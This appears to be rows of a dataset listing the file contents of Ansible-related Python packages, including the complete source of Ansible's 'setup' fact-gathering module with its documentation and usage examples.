test_group_by_skipped.yml aliases from_handlers.yml handlers.yml inventory.handlers main.yml main.yml main.yml main.yml main.yml main.yml main.yml mai main.ym main.y main.yml main.yml alternate.y main.yml main.yml ma main. runme.sh test_force_handlers.yml test_handlers.yml test_handlers_any_errors_fatal.yml test_handlers_include.yml test_handlers_include_role.yml test_handlers_including_task.yml test_handlers_inexistent_notify.yml test_handlers_listen.yml test_handlers_template_run_once.yml test_listening_handlers.yml test_templating_in_handlers.yml aliases inventory main.yml main.yml main.yml main.yml runme.sh test_handler_race.yml aliases all testhost main.yml main.yml main.yml main.yml runme.sh test_hash.yml test_inv1.yml test_inv2.yml test_inventory_hash.yml test_hash_vars.yml aliases inventory.hosts_field runme.sh test_hosts_field.json test_hosts_field.yml aliases main.yml main.yml aliases bad_exec.py bad_put_file.py inventory main.yml runme.sh test_base_cannot_connect.yml test_cannot_connect.yml test_with_bad_plugins.yml aliases main.yml cf_template.json main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml check_mode.yml main.yml setup.yml test.yml aliases create_inventor empty_inventory populate_cache. setup.yml tear_down.yml test_invalid_aw test_inventory_ test_populating test_refresh_in runme.sh inventory.yml inventory_with_ test.aws_ec2.yml aliases inventory_1.docker_s inventory_2.docker_s main.yml swarm_clea swarm_setu test_inven runme.sh aliases ansible.cfg inspect_cache.yml runme.sh test_foreman_inventory.ym aliases main.yaml ios1.cfg nonascii.bin cli.yaml main.yaml net_get.yaml net_put.yaml aliases main.yml main.yml setup.yml teardown.yml test_grow_reduce.yml test_indempotency.yml aliases main.yml main.yml main.yml mongod_singlenode.y mongod_teardown.yml aliases main.yml main.yml main.yml postgresql_user_gener postgresql_user_initi test_no_password_chan test_password.yml aliases main.yml main.yml main.yml Debian.yml Fedora.yml main.yml RedHat-7.yml RedHat-8.yml Suse.yml Debian.yml default.yml Fedora.yml RedHat-7.yml RedHat-8.yml Suse.yml Ubuntu-14.yml aliases main.yml common.yml main.yml aliases repo.tar.xz main.yaml main.yaml README.md main.yaml aliases main.yml main.yml main.yml aliases main.yml dummy--1.0.sql dummy--2.0.sql dummy--3.0.sql dummy.control pg_hba.conf main.yml ssl.yml Debian-8.yml default-py3.yml default.yml FreeBSD-11-py3.yml FreeBSD-11.yml FreeBSD-12.0-py3.y FreeBSD-12.0.yml FreeBSD-12.1-py3.y FreeBSD-12.1.yml RedHat-py3.yml RedHat.yml Ubuntu-12.yml Ubuntu-14.yml Ubuntu-16-py3.yml Ubuntu-16.yml Ubuntu-18-py3.yml Ubuntu-20-py3.yml aliases ca_certificate.pem ca_key.pem client_certificate.pem client_key.pem server_certificate.pem server_key.pem main.yml aliases bar.txt foo.txt main.yml aliases main.yml test.yml aliases main.yaml cli.yaml cli_config.yaml main.yaml backup.yaml check_config.yaml comment.yaml config.cfg save.yaml simple.yaml cli_backup.yam cli_basic.yaml cli_comment.ya aliases main.yaml main.yaml cli.yaml main.yaml deleted.yaml empty_config merged.yaml overridden.y replaced.yam rtt.yaml _populate.ya _populate_in _remove_conf main.yaml aliases main.yaml aliases main.yml empty.txt foo.txt bar.txt baz.txt neste readme.txt vault-file main.yml remote_tests.yml tests.yml aliases main.yml main.yml pre_test.yml tests.yml partition_ aliases xTestDsc.psd1 xTestDsc.psd1 main.yml main.yml tests.yml aliases test.txt testempty.txt testnoeof.txt test_linebreak.txt test_quoting.txt main.yml main.yml aliases win_ping_set_attr.ps1 win_ping_strict_mode_error win_ping_syntax_error.ps1 win_ping_throw.ps1 win_ping_throw_string.ps1 main.yml aliases main.yml main.yml aliases main.yml main.yml aliases main.yml post_reboot.ps1 aliases test_win_securi main.yml tests.yml aliases ansible-xml-beers-unicode.xml ansible-xml-beers.xml ansible-xml-namespaced-beers.x test-add-children-elements-unic test-add-children-elements.xml test-add-children-from-groupvar test-add-children-insertafter.x test-add-children-insertbefore. test-add-children-with-attribut test-add-element-implicitly.yml test-add-namespaced-children-el test-pretty-print-only.xml test-pretty-print.xml test-remove-attribute.xml test-remove-element.xml test-remove-namespaced-attribut test-remove-namespaced-element. test-set-attribute-value-unicod test-set-attribute-value.xml test-set-children-elements-leve test-set-children-elements-unic test-set-children-elements.xml test-set-element-value-empty.xm test-set-element-value-unicode. test-set-element-value.xml test-set-namespaced-attribute-v test-set-namespaced-element-val main.yml test-add-children-elements-unicod test-add-children-elements.yml test-add-children-from-groupvars. test-add-children-insertafter.yml test-add-children-insertbefore.ym test-add-children-with-attributes test-add-element-implicitly.yml test-add-namespaced-children-elem test-children-elements-xml.yml test-count-unicode.yml test-count.yml test-get-element-content-unicode. test-get-element-content.yml test-mutually-exclusive-attribute test-pretty-print-only.yml test-pretty-print.yml test-remove-attribute.yml test-remove-element.yml test-remove-namespaced-attribute. test-remove-namespaced-element.ym test-set-attribute-value-unicode. test-set-attribute-value.yml test-set-children-elements-level. test-set-children-elements-unicod test-set-children-elements.yml test-set-element-value-empty.yml test-set-element-value-unicode.ym test-set-element-value.yml test-set-namespaced-attribute-val test-set-namespaced-children-elem test-set-namespaced-element-value test-xmlstring.yml main.yml aliases import_apply.yml include_apply.yml include_tasks.yml main.yml main.ym playbook.yml tasks.yml block_include_tasks.yml import.yml import_include_include_tasks include_level_1.yml playbook.yml inventory nested.yml playbook.yml loca main othe all.yml playbook1.yml playbook2.yml playbook3.yml playbook4.yml playbook_needing_vars.yml helloworl sub_playbook.yml test_import_playbook.yml test_import_playbook_tags.yml validate1.yml validate2.yml validate34.yml validate_tags.yml no_bleeding.yml no_overwrite_roles.yml playbook.yml,"#!/usr/bin/python
# -*- coding: utf-8 -*-

# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import absolute_import, division, print_function
__metaclass__ = type


DOCUMENTATION = '''
---
module: setup
version_added: historical
short_description: Gathers facts about remote hosts
options:
    gather_subset:
        version_added: ""2.1""
        description:
            - ""If supplied, restrict the additional facts collected to the given subset.
              Possible values: C(all), C(min), C(hardware), C(network), C(virtual), C(ohai), and
              C(facter). Can specify a list of values to specify a larger subset.
              Values can also be used with an initial C(!) to specify that
              that specific subset should not be collected.  For instance:
              C(!hardware,!network,!virtual,!ohai,!facter). If C(!all) is specified
              then only the min subset is collected. To avoid collecting even the
              min subset, specify C(!all,!min). To collect only specific facts,
              use C(!all,!min), and specify the particular fact subsets.
              Use the filter parameter if you do not want to display some collected
              facts.""
        default: ""all""
    gather_timeout:
        version_added: ""2.2""
        description:
            - Set the default timeout in seconds for individual fact gathering.
        default: 10
    filter:
        version_added: ""1.1""
        description:
            - If supplied, only return facts that match this shell-style (fnmatch) wildcard.
        default: ""*""
    fact_path:
        version_added: ""1.3""
        description:
            - Path used for local ansible facts (C(*.fact)) - files in this dir
              will be run (if executable) and their results be added to C(ansible_local) facts.
              If a file is not executable it is read instead.
              File/results format can be JSON or INI-format. The default C(fact_path) can be
              specified in C(ansible.cfg) for when setup is automatically called as part of
              C(gather_facts).
              NOTE - For windows clients, the results will be added to a variable named after the
              local file (without extension suffix), rather than C(ansible_local).
            - Since Ansible 2.1, Windows hosts can use C(fact_path). Make sure that this path
              exists on the target host. Files in this path MUST be PowerShell scripts C(.ps1)
              which outputs an object. This object will be formatted by Ansible as json so the
              script should be outputting a raw hashtable, array, or other primitive object.
        default: /etc/ansible/facts.d
description:
    - This module is automatically called by playbooks to gather useful
      variables about remote hosts that can be used in playbooks. It can also be
      executed directly by C(/usr/bin/ansible) to check what variables are
      available to a host. Ansible provides many I(facts) about the system,
      automatically.
    - This module is also supported for Windows targets.
notes:
    - More ansible facts will be added with successive releases. If I(facter) or
      I(ohai) are installed, variables from these programs will also be snapshotted
      into the JSON file for usage in templating. These variables are prefixed
      with C(facter_) and C(ohai_) so it's easy to tell their source. All variables are
      bubbled up to the caller. Using the ansible facts and choosing to not
      install I(facter) and I(ohai) means you can avoid Ruby-dependencies on your
      remote systems. (See also M(community.general.facter) and M(community.general.ohai).)
    - The filter option filters only the first level subkey below ansible_facts.
    - If the target host is Windows, you will not currently have the ability to use
      C(filter) as this is provided by a simpler implementation of the module.
    - This module is also supported for Windows targets.
    - This module should be run with elevated privileges on BSD systems to gather facts like ansible_product_version.
    - Supports C(check_mode).
author:
    - ""Ansible Core Team""
    - ""Michael DeHaan""
'''

EXAMPLES = """"""
# Display facts from all hosts and store them indexed by I(hostname) at C(/tmp/facts).
# ansible all -m ansible.builtin.setup --tree /tmp/facts

# Display only facts regarding memory found by ansible on all hosts and output them.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_*_mb'

# Display only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'filter=facter_*'

# Collect only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!any,facter'

- name: Collect only facts returned by facter
  ansible.builtin.setup:
    gather_subset:
      - '!all'
      - '!any'
      - facter

# Display only facts about certain interfaces.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_eth[0-2]'

# Restrict additional gathered facts to network and virtual (includes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=network,virtual'

# Collect only network and virtual (excludes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!any,network,virtual'

# Do not call puppet facter or ohai even if present.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!facter,!ohai'

# Only collect the default minimum amount of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all'

# Collect no facts, even the default minimum subset of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!min'

# Display facts from Windows hosts with custom facts stored in C(C:\\custom_facts).
# ansible windows -m ansible.builtin.setup -a ""fact_path='c:\\custom_facts'""
""""""

# import module snippets
from ..module_utils.basic import AnsibleModule

from ansible.module_utils._text import to_text
from ansible.module_utils.facts import ansible_collector, default_collectors
from ansible.module_utils.facts.collector import CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep
from ansible.module_utils.facts.namespace import PrefixFactNamespace


def main():
    module = AnsibleModule(
        argument_spec=dict(
            gather_subset=dict(default=[""all""], required=False, type='list'),
            gather_timeout=dict(default=10, required=False, type='int'),
            filter=dict(default=""*"", required=False),
            fact_path=dict(default='/etc/ansible/facts.d', required=False, type='path'),
        ),
        supports_check_mode=True,
    )

    gather_subset = module.params['gather_subset']
    gather_timeout = module.params['gather_timeout']
    filter_spec = module.params['filter']

    # TODO: this mimics existing behavior where gather_subset=[""!all""] actually means
    #       to collect nothing except for the below list
    # TODO: decide what '!all' means, I lean towards making it mean none, but likely needs
    #       some tweaking on how gather_subset operations are performed
    minimal_gather_subset = frozenset(['apparmor', 'caps', 'cmdline', 'date_time',
                                       'distribution', 'dns', 'env', 'fips', 'local',
                                       'lsb', 'pkg_mgr', 'platform', 'python', 'selinux',
                                       'service_mgr', 'ssh_pub_keys', 'user'])

    all_collector_classes = default_collectors.collectors

    # rename namespace_name to root_key?
    namespace = PrefixFactNamespace(namespace_name='ansible',
                                    prefix='ansible_')

    try:
        fact_collector = ansible_collector.get_ansible_collector(all_collector_classes=all_collector_classes,
                                                                 namespace=namespace,
                                                                 filter_spec=filter_spec,
                                                                 gather_subset=gather_subset,
                                                                 gather_timeout=gather_timeout,
                                                                 minimal_gather_subset=minimal_gather_subset)
    except (TypeError, CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep) as e:
        # bad subset given, collector, idk, deps declared but not found
        module.fail_json(msg=to_text(e))

    facts_dict = fact_collector.collect(module=module)

    module.exit_json(ansible_facts=facts_dict)


if __name__ == '__main__':
    main()
",0
ansible-compat-2.2.0,0,1,1,1,0,0,0,0,.flake8 CODEOWNERS CODE_OF_CONDUCT.md release-drafter.yml ack.yml push.yml release.yml tox.yml .gitignore .pre-commit-config.yaml .pylintrc .readthedocs.yml .yamllint codecov.yml conf.py examples.md index.md requirements.yml requirements.yml LICENSE mypy.ini PKG-INFO pyproject.toml README.md requirements.txt setup.cfg config.py constants.py errors.py loaders.py ports.py prerun.py py.typed runtime.py schema.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt requirements-invalid-collection.yml requirements-invalid-role.yml validate0_data.json validate0_expected.json validate0_schema.json galaxy.yml galaxy.yml converge.yml molecule.yml converge.yml molecule.yml main.yml conftest.py main.yml requirements.yml main.yml main.yml main.yml main.yml test_api.py test_config.py test_configuration_example.py test_prerun.py test_runtime.py test_runtime_example.py test_schema.py __init__.py tox.ini,,1
ansible-core-2.13.2,1,1,1,1,0,0,0,0,ansible ansible-config ansible-connection ansible-console ansible-doc ansible-galaxy ansible-inventory ansible-playbook ansible-pull ansible-test ansible-vault CHANGELOG-v2.13.rst CHANGELOG.rst changelog.yaml COPYING find-plugin-refs.py testing_formatter.sh .gitignore .nojekyll banner.html breadcrumbs.html version_chooser.html ansible_2_10.inv ansible_2_5.inv ansible_2_6.inv ansible_2_7.inv ansible_2_8.inv ansible_2_9.inv ansible_3.inv ansible_4.inv ansible_5.inv ansible_6.inv collection-plugins.yml jinja2.inv Makefile Makefile.sphinx modules.js python2.inv python3.inv README.md requirements.txt 2.10_index.rst 404.rst ansible_index.rst index.rst all_plugins.rst advanced_index.rst code_of_conduct.rst collection_integration_about. collection_integration_about.rst collection_integration_add.rs collection_integration_add.rst collection_integration_runnin collection_integration_running.rst collection_integration_tests. collection_integration_tests.rst collection_integration_updati collection_integration_updating.rst collection_release_without_br collection_release_without_branches.rst collection_release_with_branc collection_release_with_branches.rst collection_releasing.rst collection_reviewing.rst collection_test_pr_locally.rs collection_test_pr_locally.rst collection_unit_tests.rst test_index.rst collection_development_process.rst committer_guidelines.rst communication.rst contributing_maintained_collections.rst contributions.rst contributions_collections.rst contributor_license_agreement.rst contributor_path.rst create_pr_quick_start.rst development_process.rst documentation_contributions.rst getting_started.rst github_admins.rst how_can_I_help.rst index.rst maintainers.rst maintainers_guidelines.rst maintainers_workflow.rst other_tools_and_programs.rst release_managers.rst reporting_bugs_and_features.rst reporting_collections.rst community_steering_committee.rst steering_committee_membership.rst steering_committee_past_members.rst steering_index.rst core_index.rst ansible_index.rst core_branches_and_tags.rst core_index.rst debugging.rst developing_api.rst developing_collections.rst developing_collections_changelogs.rst developing_collections_contributing.rst developing_collections_creating.rst developing_collections_distributing.rst developing_collections_migrating.rst developing_collections_shared.rst developing_collections_structure.rst developing_collections_testing.rst developing_core.rst developing_inventory.rst developing_locally.rst developing_modules.rst developing_modules_best_practices.rst developing_modules_checklist.rst developing_modules_documenting.rst developing_modules_general.rst developing_modules_general_aci.rst developing_modules_general_windows.rst developing_modules_in_groups.rst developing_module_utilities.rst developing_plugins.rst developing_program_flow_modules.rst developing_python_3.rst developing_rebasing.rst migrating_roles.rst module_lifecycle.rst overview_architecture.rst aws_guidelines.rst openstack_guidelines.rst ovirt_dev_guide.rst vmware_guidelines.rst vmware_rest_guidelines.rst licensing.txt basic_rules.rst grammar_punctuation.rst commas-matter-2.jpg commas-matter.jpg hyphen-funny.jpg thenvsthan.jpg index.rst resources.rst search_hints.rst spelling_word_choice.rst trademarks.rst voice_style.rst why_use.rst action-plugin-docs.rst ansible-doc.rst ansible-requirements.rst ansible-test-future-boilerplate.rst ansible-var-precedence-check.rst azure-requirements.rst boilerplate.rst changelog.rst compile.rst configure-remoting-ps1.rst deprecated-config.rst docs-build.rst empty-init.rst future-import-boilerplate.rst ignores.rst import.rst line-endings.rst metaclass-boilerplate.rst mypy.rst no-assert.rst no-basestring.rst no-dict-iteritems.rst no-dict-iterkeys.rst no-dict-itervalues.rst no-get-exception.rst no-illegal-filenames.rst no-main-display.rst no-smart-quotes.rst no-tests-as-filters.rst no-underscore-variable.rst no-unicode-literals.rst no-unwanted-files.rst no-wildcard-import.rst obsolete-files.rst package-data.rst pep8.rst pslint.rst pylint-ansible-test.rst pylint.rst replace-urlopen.rst required-and-default-attributes.rst rstcheck.rst runtime-metadata.rst sanity-docs.rst shebang.rst shellcheck.rst symlinks.rst test-constraints.rst update-bundled.rst use-argspec-type-path.rst use-compat-six.rst validate-modules.rst yamllint.rst testing.rst testing_compile.rst testing_documentation.rst testing_httptester.rst testing_integration.rst testing_integration_legacy.rst testing_pep8.rst testing_running_locally.rst testing_sanity.rst testing_units.rst testing_units_modules.rst testing_validate-modules.rst dev_guide.rst user_guide.rst first_playbook_output.txt ping_inventory_output.txt ping_output.txt get_started_inventory.rst get_started_playbook.rst index.rst first_playbook.yaml inventory_example_vms.yaml inventory_group_structure.yaml inventory_variables_group.yaml inventory_variables_host.yaml ansible_basic.svg cow.png index.rst installation_distros.rst intro_configuration.rst intro_installation.rst implicit_localhost.rst 404.po api.po cli.po collections.po community.po dev_guide.po galaxy.po index.po installation_guide.po inventory.po network.po plugins.po porting_guides.po reference_appendices.po roadmap.po scenario_guides.po developing_plugins_network.rst developing_resource_modules_network.rst documenting_modules_network.rst index.rst basic_concepts.rst first_inventory.rst first_playbook.rst index.rst intermediate_concepts.rst network_connection_options.rst network_differences.rst network_resources.rst network_roles.rst first_playbook.yml first_playbook_ext.yml index.rst cli_parsing.rst faq.rst index.rst network_best_practices_2.5.rst network_debug_troubleshooting.rst network_resource_modules.rst network_working_with_command_output.rst platform_ce.rst platform_cnos.rst platform_dellos10.rst platform_dellos6.rst platform_dellos9.rst platform_enos.rst platform_eos.rst platform_eric_eccli.rst platform_exos.rst platform_frr.rst platform_icx.rst platform_index.rst platform_ios.rst platform_iosxr.rst platform_ironware.rst platform_junos.rst platform_meraki.rst platform_netconf_enabled.rst platform_netvisor.rst platform_nos.rst platform_nxos.rst platform_routeros.rst platform_slxos.rst platform_voss.rst platform_vyos.rst platform_weos4.rst SSH_warning.txt validate.rst action.rst become.rst cache.rst callback.rst cliconf.rst connection.rst docs_fragment.rst filter.rst httpapi.rst index.html inventory.rst lookup.rst module.rst module_util.rst netconf.rst plugins.rst shell.rst strategy.rst terminal.rst test.rst vars.rst core_porting_guides.rst porting_guides.rst porting_guide_2.0.rst porting_guide_2.10.rst porting_guide_2.3.rst porting_guide_2.4.rst porting_guide_2.5.rst porting_guide_2.6.rst porting_guide_2.7.rst porting_guide_2.8.rst porting_guide_2.9.rst porting_guide_3.rst porting_guide_4.rst porting_guide_5.rst porting_guide_6.rst porting_guide_base_2.10.rst porting_guide_core_2.11.rst porting_guide_core_2.12.rst porting_guide_core_2.13.rst .rstcheck.cfg automationhub.rst common_return_values.rst faq.rst general_precedence.rst glossary.rst interpreter_discovery.rst logging.rst module_utils.rst python_3_support.rst release_and_maintenance.rst special_variables.rst test_strategies.rst tower.rst YAMLSyntax.rst ansible_core_roadmap_index.rst ansible_roadmap_index.rst COLLECTIONS_2_10.rst COLLECTIONS_3_0.rst COLLECTIONS_4.rst COLLECTIONS_5.rst COLLECTIONS_6.rst index.rst old_roadmap_index.rst ROADMAP_2_10.rst ROADMAP_2_11.rst ROADMAP_2_12.rst ROADMAP_2_13.rst ROADMAP_2_5.rst ROADMAP_2_6.rst ROADMAP_2_7.rst ROADMAP_2_8.rst ROADMAP_2_9.rst cloud_guides.rst guides.rst guide_aci.rst guide_alicloud.rst guide_aws.rst guide_azure.rst guide_cloudstack.rst guide_docker.rst guide_gce.rst guide_infoblox.rst guide_meraki.rst guide_online.rst guide_oracle.rst guide_packet.rst guide_rax.rst guide_scaleway.rst guide_vagrant.rst guide_vmware_rest.rst guide_vultr.rst network_guides.rst scenario_template.rst virt_guides.rst authentication.rst collect_information.rst create_vm.rst installation.rst run_a_vm.rst Add_a_floppy Add_a_floppy_disk_drive.result.json Add_a_floppy_disk_drive.task.yaml Attach_an_IS Attach_an_ISO_image_to_a_guest_VM.result.json Attach_an_ISO_image_to_a_guest_VM.task.yaml Attach_a_VM_ Attach_a_VM_to_a_dvswitch.result.json Attach_a_VM_to_a_dvswitch.task.yaml Build_a_list Build_a_list_of_all_the_clusters.result.json Build_a_list_of_all_the_clusters.task.yaml Build_a_list_of_all_the_folders.result.json Build_a_list_of_all_the_folders.task.yaml Build_a_list_of_all_the_folders_with_the_type_VIRTUAL_MACHINE_and_called_vm.result.json Build_a_list_of_all_the_folders_with_the_type_VIRTUAL_MACHINE_and_called_vm.task.yaml Change_vm-to Change_vm-tools_upgrade_policy_to_MANUAL.result.json Change_vm-tools_upgrade_policy_to_MANUAL.task.yaml Change_vm-tools_upgrade_policy_to_UPGRADE_AT_POWER_CYCLE.result.json Change_vm-tools_upgrade_policy_to_UPGRADE_AT_POWER_CYCLE.task.yaml collect_a_li collect_a_list_of_the_datacenters.result.json collect_a_list_of_the_datacenters.task.yaml Collect_info Collect_information_about_a_specific_VM.result.json Collect_information_about_a_specific_VM.task.yaml Collect_the_ Collect_the_hardware_information.result.json Collect_the_hardware_information.task.yaml Create_a_new Create_a_new_disk.result.json Create_a_new_disk.task.yaml Create_a_SAT Create_a_SATA_adapter_at_PCI_slot_34.result.json Create_a_SATA_adapter_at_PCI_slot_34.task.yaml Create_a_VM. Create_a_VM.result.json Create_a_VM.task.yaml Dedicate_one Dedicate_one_core_to_the_VM.result.json Dedicate_one_core_to_the_VM.task.yaml Get_guest_fi Get_guest_filesystem_information.result.json Get_guest_filesystem_information.task.yaml Get_guest_id Get_guest_identity_information.result.json Get_guest_identity_information.task.yaml Get_guest_ne Get_guest_networking_information.result.json Get_guest_networking_information.task.yaml Get_guest_network_interfaces_information.result.json Get_guest_network_interfaces_information.task.yaml Get_guest_network_routes_information.result.json Get_guest_network_routes_information.task.yaml Get_guest_po Get_guest_power_information.result.json Get_guest_power_information.task.yaml Get_VM_stora Get_VM_storage_policy.result.json Get_VM_storage_policy.task.yaml Increase_the Increase_the_memory_of_a_VM.result.json Increase_the_memory_of_a_VM.task.yaml List_the_cdr List_the_cdrom_devices_on_the_guest.result.json List_the_cdrom_devices_on_the_guest.task.yaml List_the_SCS List_the_SCSI_adapter_of_a_given_VM.result.json List_the_SCSI_adapter_of_a_given_VM.task.yaml Look_up_the_ Look_up_the_VM_called_test_vm1_in_the_inventory.result.json Look_up_the_VM_called_test_vm1_in_the_inventory.task.yaml Remove_SATA_ Remove_SATA_adapter_at_PCI_slot_34.result.json Retrieve_a_l Retrieve_a_list_of_all_the_datastores.result.json Retrieve_a_list_of_all_the_datastores.task.yaml Retrieve_det Retrieve_details_about_the_first_cluster.result.json Retrieve_details_about_the_first_cluster.task.yaml Retrieve_the Retrieve_the_disk_information_from_the_VM.result.json Retrieve_the_disk_information_from_the_VM.task.yaml Retrieve_the_memory_information_from_the_VM.result.json Retrieve_the_memory_information_from_the_VM.task.yaml Turn_the_NIC Turn_the_NIC's_start_connected_flag_on.result.json Turn_the_NIC's_start_connected_flag_on.task.yaml Turn_the_pow Turn_the_power_of_the_VM_on.result.json Turn_the_power_of_the_VM_on.task.yaml Upgrade_the_ Upgrade_the_VM_hardware_version.result.json Upgrade_the_VM_hardware_version.task.yaml Wait_until_m Wait_until_my_VM_is_ready.result.json Wait_until_my_VM_is_ready.task.yaml vm_hardware_tuning.rst vm_info.rst vm_tool_configuration.rst vm_tool_information.rst basic_concepts.txt download_tarball_collections.txt galaxy_server_list.txt installing_collections.txt installing_collections_file.rst installing_collections_git_repo.txt installing_multiple_collections.txt installing_older_collection.txt basic_concepts.rst become.rst cheatsheet.rst collections_using.rst command_line_tools.rst complex_data_manipulation.rst connection_details.rst guide_rolling_upgrade.rst index.rst intro.rst intro_adhoc.rst intro_bsd.rst intro_dynamic_inventory.rst intro_inventory.rst intro_patterns.rst intro_windows.rst modules.rst modules_intro.rst modules_support.rst playbooks.rst playbooks_advanced_syntax.rst playbooks_async.rst playbooks_best_practices.rst playbooks_blocks.rst playbooks_checkmode.rst playbooks_conditionals.rst playbooks_debugger.rst playbooks_delegation.rst playbooks_environment.rst playbooks_error_handling.rst playbooks_filters.rst playbooks_filters_ipaddr.rst playbooks_handlers.rst playbooks_intro.rst playbooks_lookups.rst playbooks_loops.rst playbooks_module_defaults.rst playbooks_prompts.rst playbooks_python_version.rst playbooks_reuse.rst playbooks_reuse_includes.rst playbooks_reuse_roles.rst playbooks_roles.rst playbooks_special_topics.rst playbooks_startnstep.rst playbooks_strategies.rst playbooks_tags.rst playbooks_templating.rst playbooks_tests.rst playbooks_variables.rst playbooks_vars_facts.rst playbooks_vault.rst playbook_pathing.rst plugin_filtering_config.rst sample_setup.rst role_directory.txt SSH_password_prompt.txt with2loop.txt vault.rst windows.rst windows_dsc.rst windows_faq.rst windows_performance.rst windows_setup.rst windows_usage.rst windows_winrm.rst 2.10_conf.py all_conf.py ansible_conf.py core_conf.py variables.dot core-color-scheme.css .gitignore ansible-config.1 ansible-console.1 ansible-doc.1 ansible-galaxy.1 ansible-inventory.1 ansible-playbook.1 ansible-pull.1 ansible-vault.1 ansible.1 .gitdir cli_rst.j2 collections_galaxy_meta.rst.j2 config.rst.j2 man.j2 modules_by_category.rst.j2 playbooks_keywords.rst.j2 ansible.cfg hosts ConfigureRemotingForAnsible.ps1 upgrade_to_ps3.ps1 build-ansible.py announce.py change_detection.py commands.py collection_meta.py docs_build.py dump_config.py dump_keywords.py file_deprecated_issues.py generate_man.py porting_guide.py release_announcement.py update_intersphinx.py errors.py __init__.py __init__.py test-module.py update-sanity-requirements.py adhoc.py option_helpers.py __init__.py config.py console.py doc.py galaxy.py inventory.py playbook.py pull.py ansible_connection_cli_stub.py __init__.py vault.py __init__.py list.py __init__.py __init__.py __init__.py ansible_builtin_runtime.yml base.yml data.py manager.py __init__.py constants.py context.py yaml_strings.py __init__.py action_write_locks.py python_target.py __init__.py interpreter_discovery.py module_common.py playbook_executor.py play_iterator.py async_watchdog.ps1 async_wrapper.ps1 become_wrapper.ps1 bootstrap_wrapper.ps1 coverage_wrapper.ps1 exec_wrapper.ps1 module_manifest.py module_powershell_wrapper.ps1 module_script_wrapper.ps1 module_wrapper.ps1 __init__.py worker.py __init__.py stats.py task_executor.py task_queue_manager.py task_result.py __init__.py api.py concrete_artifact_manager.py galaxy_api_proxy.py gpg.py __init__.py .travis.yml apb.yml.j2 main.yml.j2 Dockerfile.j2 .git_keep main.yml.j2 Makefile.j2 main.yml.j2 deprovision.yml.j2 provision.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 collections_galaxy_meta.yml .travis.yml main.yml.j2 .git_keep main.yml.j2 container.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 .git_keep galaxy.yml.j2 README.md.j2 README.md.j2 .git_keep .travis.yml main.yml.j2 .git_keep main.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep inventory test.yml.j2 main.yml.j2 .travis.yml example.py.j2 main.yml.j2 .git_keep example_command.py.j2 example_config.py.j2 example_facts.py.j2 main.yml.j2 example.py.j2 example.py.j2 README.md main.yml.j2 .git_keep example.py.j2 inventory test.yml.j2 main.yml.j2 dataclasses.py errors.py providers.py reporters.py resolvers.py versioning.py __init__.py role.py token.py user_agent.py __init__.py data.py group.py helpers.py host.py manager.py __init__.py keyword_desc.yml add_host.py apt.py apt_key.py apt_repository.py assemble.py assert.py async_status.py async_wrapper.py blockinfile.py command.py copy.py cron.py debconf.py debug.py dnf.py dpkg_selections.py expect.py fail.py fetch.py file.py find.py gather_facts.py getent.py get_url.py git.py group.py group_by.py hostname.py import_playbook.py import_role.py import_tasks.py include_role.py include_tasks.py include_vars.py iptables.py known_hosts.py lineinfile.py meta.py package.py package_facts.py pause.py ping.py pip.py raw.py reboot.py replace.py rpm_key.py script.py service.py service_facts.py setup.py set_fact.py set_stats.py shell.py slurp.py stat.py subversion.py systemd.py sysvinit.py tempfile.py template.py unarchive.py uri.py user.py validate_argument_spec.py wait_for.py wait_for_connection.py yum.py yum_repository.py _include.py __init__.py ansible_release.py api.py basic.py arg_spec.py collections.py dict_transformations.py file.py json.py locale.py network.py parameters.py process.py respawn.py sys_info.py converters.py formatters.py __init__.py validation.py warnings.py yaml.py _collections_compat.py _json_compat.py _utils.py __init__.py importlib.py paramiko.py selectors.py selinux.py typing.py version.py _selectors2.py __init__.py connection.py Ansible.AccessToken.cs Ansible.Basic.cs Ansible.Become.cs Ansible.Privilege.cs Ansible.Process.cs __init__.py _distro.py __init__.py errors.py ansible_collector.py collector.py compat.py default_collectors.py aix.py base.py darwin.py dragonfly.py freebsd.py hpux.py hurd.py linux.py netbsd.py openbsd.py sunos.py __init__.py namespace.py aix.py base.py darwin.py dragonfly.py fc_wwn.py freebsd.py generic_bsd.py hpux.py hurd.py iscsi.py linux.py netbsd.py nvme.py openbsd.py sunos.py __init__.py facter.py ohai.py __init__.py packages.py sysctl.py apparmor.py caps.py chroot.py cmdline.py date_time.py distribution.py dns.py env.py fips.py local.py lsb.py pkg_mgr.py platform.py python.py selinux.py service_mgr.py ssh_pub_keys.py user.py __init__.py timeout.py utils.py base.py dragonfly.py freebsd.py hpux.py linux.py netbsd.py openbsd.py sunos.py sysctl.py __init__.py __init__.py json_utils.py convert_bool.py __init__.py Ansible.ModuleUtils.AddType.psm1 Ansible.ModuleUtils.ArgvParser.psm1 Ansible.ModuleUtils.Backup.psm1 Ansible.ModuleUtils.CamelConversion.psm1 Ansible.ModuleUtils.CommandUtil.psm1 Ansible.ModuleUtils.FileUtil.psm1 Ansible.ModuleUtils.Legacy.psm1 Ansible.ModuleUtils.LinkUtil.psm1 Ansible.ModuleUtils.PrivilegeUtil.psm1 Ansible.ModuleUtils.SID.psm1 Ansible.ModuleUtils.WebRequest.psm1 __init__.py pycompat24.py service.py __init__.py splitter.py urls.py yumdnf.py _text.py __init__.py ajson.py dataloader.py mod_args.py plugin_docs.py quoting.py splitter.py addresses.py jsonify.py yaml.py __init__.py __init__.py constructor.py dumper.py loader.py objects.py __init__.py __init__.py 